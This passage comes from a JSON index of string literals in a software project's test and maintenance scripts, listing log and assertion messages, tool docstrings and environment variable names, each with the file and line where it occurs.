        "auth_service/tests/test_setup.py:27"
      ]
    },
    "Failed to import optimization modules:": {
      "value": "Failed to import optimization modules:",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:38"
      ]
    },
    "Failed to install dependencies:": {
      "value": "Failed to install dependencies:",
      "category": "test_literals",
      "locations": [
        "scripts/test_frontend.py:61"
      ]
    },
    "Failed to kill PID": {
      "value": "Failed to kill PID",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:124"
      ]
    },
    "Failed to load violations file:": {
      "value": "Failed to load violations file:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:610"
      ]
    },
    "Failed to normalize": {
      "value": "Failed to normalize",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:47"
      ]
    },
    "Failed to parse LLM response": {
      "value": "Failed to parse LLM response",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:130"
      ]
    },
    "Failed to parse file": {
      "value": "Failed to parse file",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:16"
      ]
    },
    "Failed to process": {
      "value": "Failed to process",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:673"
      ]
    },
    "Failed to read": {
      "value": "Failed to read",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:185"
      ]
    },
    "Failed to reject SQL injection in password:": {
      "value": "Failed to reject SQL injection in password:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:166"
      ]
    },
    "Failed to reject SQL injection:": {
      "value": "Failed to reject SQL injection:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_security.py:154"
      ]
    },
    "Failed to remove original file:": {
      "value": "Failed to remove original file:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:291"
      ]
    },
    "Failed to send message:": {
      "value": "Failed to send message:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:363"
      ]
    },
    "Failed to split function": {
      "value": "Failed to split function",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:479"
      ]
    },
    "Failed to start Docker services": {
      "value": "Failed to start Docker services",
      "category": "test_literals",
      "locations": [
        "scripts/start_test_services.py:52"
      ]
    },
    "Failed to start auth service:": {
      "value": "Failed to start auth service:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_auth_startup_integration.py:107"
      ]
    },
    "Failed to start services:": {
      "value": "Failed to start services:",
      "category": "test_literals",
      "locations": [
        "scripts/test_cold_start_e2e.py:140"
      ]
    },
    "Failed to update test:": {
      "value": "Failed to update test:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:194"
      ]
    },
    "Failed to validate": {
      "value": "Failed to validate",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:87"
      ]
    },
    "Failed to validate sync": {
      "value": "Failed to validate sync",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_postgres_compliance.py:106"
      ]
    },
    "Failed:": {
      "value": "Failed:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:383",
        "scripts/simple_test_fix_loop.py:94",
        "scripts/test_auth_database_sessions.py:398",
        "scripts/test_coordination_fixes.py:381",
        "scripts/test_database_url_builder_comprehensive.py:349",
        "scripts/test_example_message_flow.py:322",
        "scripts/test_ssl_certificates_staging.py:306",
        "scripts/test_staging_env.py:190",
        "scripts/test_staging_migrations.py:326",
        "scripts/test_verify_workflow_status_corrected.py:196"
      ]
    },
    "FailingAgent": {
      "value": "FailingAgent",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/agents/test_agent_initialization.py:64"
      ]
    },
    "Failure rate:": {
      "value": "Failure rate:",
      "category": "test_literals",
      "locations": [
        "scripts/test_failure_scanner.py:226"
      ]
    },
    "Fake Test Scan Results:": {
      "value": "Fake Test Scan Results:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:406",
        "scripts/compliance/fake_test_scanner.py:410"
      ]
    },
    "Fake Test Scanner - Comprehensive fake test detection and reporting\n\n**BUSINESS VALUE JUSTIFICATION (BVJ):**\n1. **Segment**: Platform/Internal - Quality assurance for all tiers\n2. **Business Goal**: Platform Stability, Development Velocity, Risk Reduction\n3. **Value Impact**: Prevents false confidence from fake tests, improves reliability\n4. **Strategic Impact**: Reduces debugging time, accelerates issue resolution\n5. **Platform Stability**: Ensures all tests provide real validation\n\nThis script provides comprehensive fake test detection across the entire codebase.\nIt integrates with existing test infrastructure and generates actionable reports.\n\nUsage:\n    python scripts/compliance/fake_test_scanner.py --scan-all\n    python scripts/compliance/fake_test_scanner.py --directory app/tests\n    python scripts/compliance/fake_test_scanner.py --file app/tests/test_example.py\n    python scripts/compliance/fake_test_scanner.py --report-only": {
      "value": "Fake Test Scanner - Comprehensive fake test detection and reporting\n\n**BUSINESS VALUE JUSTIFICATION (BVJ):**\n1. **Segment**: Platform/Internal - Quality assurance for all tiers\n2. **Business Goal**: Platform Stability, Development Velocity, Risk Reduction\n3. **Value Impact**: Prevents false confidence from fake tests, improves reliability\n4. **Strategic Impact**: Reduces debugging time, accelerates issue resolution\n5. **Platform Stability**: Ensures all tests provide real validation\n\nThis script provides comprehensive fake test detection across the entire codebase.\nIt integrates with existing test infrastructure and generates actionable reports.\n\nUsage:\n    python scripts/compliance/fake_test_scanner.py --scan-all\n    python scripts/compliance/fake_test_scanner.py --directory app/tests\n    python scripts/compliance/fake_test_scanner.py --file app/tests/test_example.py\n    python scripts/compliance/fake_test_scanner.py --report-only",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:2"
      ]
    },
    "Fake Tests by Severity:": {
      "value": "Fake Tests by Severity:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:264"
      ]
    },
    "Fake Tests by Type:": {
      "value": "Fake Tests by Type:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:272"
      ]
    },
    "Fallback Mode (Execution Failed)": {
      "value": "Fallback Mode (Execution Failed)",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:272"
      ]
    },
    "Fallback to standard test execution": {
      "value": "Fallback to standard test execution",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:242"
      ]
    },
    "Falling back to standard test runner...": {
      "value": "Falling back to standard test runner...",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend_optimized.py:39"
      ]
    },
    "Fast-fail import testing for Netra Backend": {
      "value": "Fast-fail import testing for Netra Backend",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:29"
      ]
    },
    "Fast-fail import testing script for Netra Backend\n\nThis script provides quick import validation to catch import errors\nearly in the development cycle. It can be run standalone or integrated\ninto CI/CD pipelines.\n\nUsage:\n    python scripts/test_imports.py              # Test critical imports (fast-fail)\n    python scripts/test_imports.py --all        # Test all imports\n    python scripts/test_imports.py --module app.services  # Test specific module": {
      "value": "Fast-fail import testing script for Netra Backend\n\nThis script provides quick import validation to catch import errors\nearly in the development cycle. It can be run standalone or integrated\ninto CI/CD pipelines.\n\nUsage:\n    python scripts/test_imports.py              # Test critical imports (fast-fail)\n    python scripts/test_imports.py --all        # Test all imports\n    python scripts/test_imports.py --module app.services  # Test specific module",
      "category": "test_literals",
      "locations": [
        "scripts/test_imports.py:2"
      ]
    },
    "Fast-fail triggered by category:": {
      "value": "Fast-fail triggered by category:",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_runner.py:360"
      ]
    },
    "Fatal error:": {
      "value": "Fatal error:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:762"
      ]
    },
    "Feature grouping is heuristic - review carefully": {
      "value": "Feature grouping is heuristic - review carefully",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_refactor_helper.py:517"
      ]
    },
    "Feature integration tests (3-5min)": {
      "value": "Feature integration tests (3-5min)",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:39"
      ]
    },
    "Fernet Key:": {
      "value": "Fernet Key:",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:96"
      ]
    },
    "Fernet Key: MISSING": {
      "value": "Fernet Key: MISSING",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:139"
      ]
    },
    "Fernet Key: OK - Configured (from": {
      "value": "Fernet Key: OK - Configured (from",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_config.py:137"
      ]
    },
    "Field(default=\"staging\"": {
      "value": "Field(default=\"staging\"",
      "category": "test_literals",
      "locations": [
        "scripts/test_environment_detection.py:117"
      ]
    },
    "File": {
      "value": "File",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:256"
      ]
    },
    "File \"": {
      "value": "File \"",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:28"
      ]
    },
    "File \"([^\"]+\\.py)\"": {
      "value": "File \"([^\"]+\\.py)\"",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:29",
        "scripts/simple_test_fix_loop.py:30"
      ]
    },
    "File does not exist:": {
      "value": "File does not exist:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:133"
      ]
    },
    "File has": {
      "value": "File has",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:213",
        "scripts/compliance/project_test_validator.py:156",
        "scripts/compliance/real_test_requirements_enforcer.py:222",
        "scripts/compliance/real_test_requirements_enforcer.py:401",
        "scripts/compliance/real_test_validator.py:111",
        "scripts/compliance/test_size_validator.py:364"
      ]
    },
    "File not found:": {
      "value": "File not found:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:650",
        "scripts/auto_fix_test_sizes.py:684",
        "scripts/auto_fix_test_violations.py:195",
        "scripts/compliance/fake_test_scanner.py:134"
      ]
    },
    "File size:": {
      "value": "File size:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:88"
      ]
    },
    "File:": {
      "value": "File:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:328"
      ]
    },
    "Files Affected:": {
      "value": "Files Affected:",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:311"
      ]
    },
    "Files exceeding": {
      "value": "Files exceeding",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:421"
      ]
    },
    "Files fixed:": {
      "value": "Files fixed:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_utils_imports.py:92"
      ]
    },
    "Files modified:": {
      "value": "Files modified:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_e2e_test_imports.py:208"
      ]
    },
    "Files processed:": {
      "value": "Files processed:",
      "category": "test_literals",
      "locations": [
        "scripts/add_test_markers.py:226",
        "scripts/auto_fix_test_sizes.py:748",
        "scripts/fix_e2e_test_imports.py:207"
      ]
    },
    "Files split:": {
      "value": "Files split:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:749"
      ]
    },
    "Files successfully fixed:": {
      "value": "Files successfully fixed:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:311"
      ]
    },
    "Files that failed to fix:": {
      "value": "Files that failed to fix:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:312"
      ]
    },
    "Files with Violations:": {
      "value": "Files with Violations:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_violations_reporter.py:51"
      ]
    },
    "Files with import errors:": {
      "value": "Files with import errors:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:277",
        "scripts/fix_test_import_errors.py:310"
      ]
    },
    "Files with import order issues:": {
      "value": "Files with import order issues:",
      "category": "test_literals",
      "locations": [
        "scripts/check_test_import_order.py:88"
      ]
    },
    "Final Result:": {
      "value": "Final Result:",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow_status_corrected.py:211"
      ]
    },
    "Final Summary": {
      "value": "Final Summary",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:138"
      ]
    },
    "First access token should be valid": {
      "value": "First access token should be valid",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_token_blacklisting_basics.py:74"
      ]
    },
    "First allocation failed:": {
      "value": "First allocation failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:165"
      ]
    },
    "First nonce use should be allowed": {
      "value": "First nonce use should be allowed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_token_refresh.py:102"
      ]
    },
    "First state validation should succeed": {
      "value": "First state validation should succeed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_state_csrf_vulnerability.py:143"
      ]
    },
    "First use of auth code should be allowed": {
      "value": "First use of auth code should be allowed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_pkce_token_refresh.py:88"
      ]
    },
    "First use of authorization code should succeed": {
      "value": "First use of authorization code should succeed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:62"
      ]
    },
    "First use should be allowed": {
      "value": "First use should be allowed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:128"
      ]
    },
    "First use should be allowed for": {
      "value": "First use should be allowed for",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_redis_connection_failover.py:330"
      ]
    },
    "First use should succeed": {
      "value": "First use should succeed",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:68"
      ]
    },
    "Five Whys Reproduction Tests for Auth Service Staging Errors.\nReproduces each root cause identified in the Five Whys analysis.": {
      "value": "Five Whys Reproduction Tests for Auth Service Staging Errors.\nReproduces each root cause identified in the Five Whys analysis.",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/test_five_whys_reproduction.py:1"
      ]
    },
    "Fix #": {
      "value": "Fix #",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:123"
      ]
    },
    "Fix Python syntax errors": {
      "value": "Fix Python syntax errors",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/real_test_requirements_enforcer.py:202"
      ]
    },
    "Fix TestSyntaxFix classes that have __init__ constructors in test files.\n\nPytest doesn't allow test classes to have __init__ constructors.\nThis script converts them to use setup_method instead.": {
      "value": "Fix TestSyntaxFix classes that have __init__ constructors in test files.\n\nPytest doesn't allow test classes to have __init__ constructors.\nThis script converts them to use setup_method instead.",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_syntax_fix_classes.py:1"
      ]
    },
    "Fix all test issues including syntax errors and size violations.": {
      "value": "Fix all test issues including syntax errors and size violations.",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:2"
      ]
    },
    "Fix common test issues in the Netra codebase.": {
      "value": "Fix common test issues in the Netra codebase.",
      "category": "test_literals",
      "locations": [
        "scripts/fix_common_test_issues.py:2"
      ]
    },
    "Fix detected stubs (not implemented)": {
      "value": "Fix detected stubs (not implemented)",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:356"
      ]
    },
    "Fix mock component function in": {
      "value": "Fix mock component function in",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_fixer.py:358"
      ]
    },
    "Fix test_utils import errors in test files.\n\nThis script fixes the incorrect import:\n    from netra_backend.tests.test_utils import setup_test_path\n    \nAnd removes it since it's not needed (tests should be run from proper context).": {
      "value": "Fix test_utils import errors in test files.\n\nThis script fixes the incorrect import:\n    from netra_backend.tests.test_utils import setup_test_path\n    \nAnd removes it since it's not needed (tests should be run from proper context).",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_utils_imports.py:2"
      ]
    },
    "Fix the failing test:": {
      "value": "Fix the failing test:",
      "category": "test_literals",
      "locations": [
        "scripts/iterative_test_fix_loop.py:127"
      ]
    },
    "Fix the import order in test files to ensure setup_test_path() is called first.": {
      "value": "Fix the import order in test files to ensure setup_test_path() is called first.",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_order.py:1"
      ]
    },
    "Fix:": {
      "value": "Fix:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:443"
      ]
    },
    "Fixed": {
      "value": "Fixed",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:57",
        "scripts/compliance/real_test_linter.py:63",
        "scripts/fix_all_test_issues.py:245",
        "scripts/fix_test_syntax_errors.py:254"
      ]
    },
    "Fixed UserPlan import with placeholder enum": {
      "value": "Fixed UserPlan import with placeholder enum",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:73"
      ]
    },
    "Fixed UserSession import to use Session alias": {
      "value": "Fixed UserSession import to use Session alias",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:66"
      ]
    },
    "Fixed WebSocketConnectionManager import to use ConnectionManager": {
      "value": "Fixed WebSocketConnectionManager import to use ConnectionManager",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_errors.py:59"
      ]
    },
    "Fixed decorator spacing in": {
      "value": "Fixed decorator spacing in",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:60"
      ]
    },
    "Fixed duplicate import in": {
      "value": "Fixed duplicate import in",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:47"
      ]
    },
    "Fixed import order": {
      "value": "Fixed import order",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_import_order.py:85"
      ]
    },
    "Fixed imports in:": {
      "value": "Fixed imports in:",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:107",
        "scripts/align_test_imports.py:433"
      ]
    },
    "Fixed invalid syntax:": {
      "value": "Fixed invalid syntax:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:239"
      ]
    },
    "Fixed syntax in:": {
      "value": "Fixed syntax in:",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:365"
      ]
    },
    "Fixed syntax issues in:": {
      "value": "Fixed syntax issues in:",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:445"
      ]
    },
    "Fixed unmatched parens:": {
      "value": "Fixed unmatched parens:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_all_test_issues.py:243"
      ]
    },
    "Fixed:": {
      "value": "Fixed:",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:87",
        "scripts/fix_test_batch.py:382",
        "scripts/fix_test_import_order.py:101",
        "scripts/fix_test_syntax_errors.py:252",
        "scripts/fix_test_utils_imports.py:50",
        "scripts/remove_duplicate_test_setup.py:61"
      ]
    },
    "Fixes Applied:": {
      "value": "Fixes Applied:",
      "category": "test_literals",
      "locations": [
        "scripts/batch_fix_and_test.py:134"
      ]
    },
    "Fixes made:": {
      "value": "Fixes made:",
      "category": "test_literals",
      "locations": [
        "scripts/automated_test_fix_loop.py:134"
      ]
    },
    "Fixing": {
      "value": "Fixing",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:806"
      ]
    },
    "Fixing import issues...": {
      "value": "Fixing import issues...",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:84"
      ]
    },
    "Fixing test discovery paths...": {
      "value": "Fixing test discovery paths...",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:312"
      ]
    },
    "Fixing test runner configuration...": {
      "value": "Fixing test runner configuration...",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:213"
      ]
    },
    "Fixtures Tests - Split from test_oauth_flows.py": {
      "value": "Fixtures Tests - Split from test_oauth_flows.py",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/integration/test_oauth_flows_fixtures.py:1"
      ]
    },
    "Fixtures:": {
      "value": "Fixtures:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:91",
        "scripts/compliance/test_refactor_helper.py:709"
      ]
    },
    "For": {
      "value": "For",
      "category": "test_literals",
      "locations": [
        "scripts/test_database_url_builder_comprehensive.py:171",
        "scripts/test_ssl_certificates_staging.py:247"
      ]
    },
    "For detailed guidance:": {
      "value": "For detailed guidance:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/fake_test_scanner.py:313"
      ]
    },
    "For migrations:": {
      "value": "For migrations:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:203"
      ]
    },
    "For psycopg2:": {
      "value": "For psycopg2:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:71"
      ]
    },
    "Forbidden permission found:": {
      "value": "Forbidden permission found:",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/utils/assertion_helpers.py:229"
      ]
    },
    "Force kill without confirmation": {
      "value": "Force kill without confirmation",
      "category": "test_literals",
      "locations": [
        "scripts/cleanup_test_processes.py:151"
      ]
    },
    "Found": {
      "value": "Found",
      "category": "test_literals",
      "locations": [
        "scripts/align_test_imports.py:45",
        "scripts/analyze_test_overlap.py:79",
        "scripts/analyze_test_overlap.py:489",
        "scripts/cleanup_test_processes.py:106",
        "scripts/compliance/fake_test_scanner.py:74",
        "scripts/compliance/real_test_requirements_enforcer.py:83",
        "scripts/compliance/test_size_validator.py:73",
        "scripts/comprehensive_test_fixer.py:300",
        "scripts/fix_all_test_issues.py:217",
        "scripts/fix_e2e_test_imports.py:196"
      ]
    },
    "Found Alembic config:": {
      "value": "Found Alembic config:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:115"
      ]
    },
    "Found potential migration directory:": {
      "value": "Found potential migration directory:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_migrations.py:131"
      ]
    },
    "Found similar names in module:": {
      "value": "Found similar names in module:",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:124"
      ]
    },
    "Found syntax error in:": {
      "value": "Found syntax error in:",
      "category": "test_literals",
      "locations": [
        "scripts/simple_test_fix_loop.py:33"
      ]
    },
    "Four concurrent attempts should fail, got": {
      "value": "Four concurrent attempts should fail, got",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/unit/test_oauth_authorization_code_reuse_prevention.py:117"
      ]
    },
    "Frontend API Proxy": {
      "value": "Frontend API Proxy",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:151"
      ]
    },
    "Frontend API proxy is configured": {
      "value": "Frontend API proxy is configured",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:124"
      ]
    },
    "Frontend API proxy test failed:": {
      "value": "Frontend API proxy test failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:128"
      ]
    },
    "Frontend Health": {
      "value": "Frontend Health",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:86",
        "scripts/test_staging_env.py:146"
      ]
    },
    "Frontend Startup Tests": {
      "value": "Frontend Startup Tests",
      "category": "test_literals",
      "locations": [
        "scripts/startup_test_executor.py:159"
      ]
    },
    "Frontend Tests:": {
      "value": "Frontend Tests:",
      "category": "test_literals",
      "locations": [
        "scripts/test_discovery_report.py:116"
      ]
    },
    "Frontend application tests": {
      "value": "Frontend application tests",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:84"
      ]
    },
    "Frontend health check failed:": {
      "value": "Frontend health check failed:",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:52"
      ]
    },
    "Frontend is serving": {
      "value": "Frontend is serving",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:48"
      ]
    },
    "Frontend port": {
      "value": "Frontend port",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:208"
      ]
    },
    "Frontend proxy returned status": {
      "value": "Frontend proxy returned status",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:126"
      ]
    },
    "Frontend returned status": {
      "value": "Frontend returned status",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_env.py:50"
      ]
    },
    "Frontend should be in registry": {
      "value": "Frontend should be in registry",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:340"
      ]
    },
    "Frontend should have started": {
      "value": "Frontend should have started",
      "category": "test_literals",
      "locations": [
        "scripts/test_coordination_fixes.py:333"
      ]
    },
    "Full URL for debug:": {
      "value": "Full URL for debug:",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:80"
      ]
    },
    "Full analysis saved to mock_analysis.json": {
      "value": "Full analysis saved to mock_analysis.json",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_mocks.py:195"
      ]
    },
    "Full reports saved to test_reports/": {
      "value": "Full reports saved to test_reports/",
      "category": "test_literals",
      "locations": [
        "scripts/analyze_test_overlap.py:664"
      ]
    },
    "Full test suite (30-45min)": {
      "value": "Full test suite (30-45min)",
      "category": "test_literals",
      "locations": [
        "scripts/unified_test_config.py:47"
      ]
    },
    "Function": {
      "value": "Function",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:192"
      ]
    },
    "Function '": {
      "value": "Function '",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:237",
        "scripts/auto_fix_test_violations.py:274",
        "scripts/auto_fix_test_violations.py:294",
        "scripts/auto_fix_test_violations.py:307",
        "scripts/compliance/project_test_validator.py:251",
        "scripts/compliance/real_test_validator.py:213",
        "scripts/compliance/test_limits_checker.py:209"
      ]
    },
    "Function accepts *args, **kwargs and returns static data": {
      "value": "Function accepts *args, **kwargs and returns static data",
      "category": "test_literals",
      "locations": [
        "scripts/remove_test_stubs.py:198"
      ]
    },
    "Function refactoring is disabled.": {
      "value": "Function refactoring is disabled.",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_violations.py:610"
      ]
    },
    "Function/class": {
      "value": "Function/class",
      "category": "test_literals",
      "locations": [
        "scripts/fix_test_batch.py:116"
      ]
    },
    "Functions added:": {
      "value": "Functions added:",
      "category": "test_literals",
      "locations": [
        "scripts/comprehensive_test_fixer.py:399"
      ]
    },
    "Functions exceeding": {
      "value": "Functions exceeding",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/test_size_validator.py:422"
      ]
    },
    "Functions optimized:": {
      "value": "Functions optimized:",
      "category": "test_literals",
      "locations": [
        "scripts/auto_fix_test_sizes.py:750"
      ]
    },
    "Functions:": {
      "value": "Functions:",
      "category": "test_literals",
      "locations": [
        "scripts/compliance/demo_test_size_enforcement.py:89",
        "scripts/compliance/test_refactor_helper.py:707"
      ]
    },
    "GC frequency": {
      "value": "GC frequency",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/models.py:89"
      ]
    },
    "GC pause:": {
      "value": "GC pause:",
      "category": "test_literals",
      "locations": [
        "netra_backend/app/services/realistic_test_data/log_generator.py:118"
      ]
    },
    "GCE_METADATA_HOST": {
      "value": "GCE_METADATA_HOST",
      "category": "test_literals",
      "locations": [
        "auth_service/test_staging_db_connection.py:227"
      ]
    },
    "GCP_PROJECT_ID": {
      "value": "GCP_PROJECT_ID",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:34",
        "scripts/test_staging.py:32"
      ]
    },
    "GCP_PROJECT_ID_NUMERICAL_STAGING": {
      "value": "GCP_PROJECT_ID_NUMERICAL_STAGING",
      "category": "test_literals",
      "locations": [
        "scripts/test_config_loading.py:34",
        "scripts/test_staging_config.py:43",
        "scripts/test_staging_config.py:63"
      ]
    },
    "GCP_REGION": {
      "value": "GCP_REGION",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging.py:33"
      ]
    },
    "GEMINI_API_KEY": {
      "value": "GEMINI_API_KEY",
      "category": "test_literals",
      "locations": [
        "scripts/test_backend.py:91",
        "scripts/test_backend.py:91",
        "scripts/test_config_loading.py:34",
        "scripts/test_staging_config.py:53"
      ]
    },
    "GET": {
      "value": "GET",
      "category": "test_literals",
      "locations": [
        "scripts/test_staging_deployment.py:37",
        "scripts/test_staging_deployment.py:84",
        "scripts/test_staging_deployment.py:85",
        "scripts/test_staging_deployment.py:86",
        "scripts/test_staging_deployment.py:104",
        "scripts/test_staging_deployment.py:106",
        "scripts/test_staging_deployment.py:108",
        "scripts/test_staging_deployment.py:127",
        "scripts/test_staging_deployment.py:128"
      ]
    },
    "GITHUB_CLIENT_ID": {
      "value": "GITHUB_CLIENT_ID",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:40",
        "auth_service/tests/config/test_env.py:204",
        "auth_service/tests/config/test_settings.py:187"
      ]
    },
    "GITHUB_CLIENT_SECRET": {
      "value": "GITHUB_CLIENT_SECRET",
      "category": "test_literals",
      "locations": [
        "auth_service/tests/config/test_env.py:41",
        "auth_service/tests/config/test_env.py:205",
        "auth_service/tests/config/test_settings.py:188"
      ]
    },
    "GITHUB_TOKEN": {
      "value": "GITHUB_TOKEN",
      "category": "test_literals",
      "locations": [
        "scripts/test_verify_workflow.py:57"
      ]
    },
    "GOOGLE_CLIENT_ID": {
      "value": "GOOGLE_CLIENT_ID",
      "category": "test_literals",
      "locations": [
        "auth_service/test_actual_staging_credentials.py:44",
        "auth_service/test_url_construction.py:45",
        "auth_service/tests/config/test_env.py:38",
        "auth_service/tests/config/test_env.py:202",
        "auth_service/tests/config/test_settings.py:185",
        "auth_service/tests/conftest.py:30",
        "auth_service/tests/test_critical_oauth_environment_failures.py:44",
        "auth_service/tests/test_critical_oauth_environment_failures.py:98",
        "auth_service/tests/test_critical_oauth_environment_failures.py:99",
        "auth_service/tests/test_critical_oauth_environment_failures.py:109"
      ]
    },
    "GOOGLE_CLIENT_ID correctly detected as missing:": {
